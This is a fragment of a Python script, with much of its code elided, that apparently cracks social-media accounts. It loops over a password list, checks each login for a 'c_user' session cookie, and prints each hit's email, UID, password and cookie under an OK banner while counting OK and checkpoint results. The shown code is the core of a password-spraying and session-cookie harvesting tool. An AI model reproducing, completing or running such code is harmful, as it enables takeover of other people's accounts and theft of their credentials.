...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    #os.system("play-audio WELCOME_TO_SB_BOOT_818.mp3")
    os.getuid
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[S37L-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SOHAIL] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
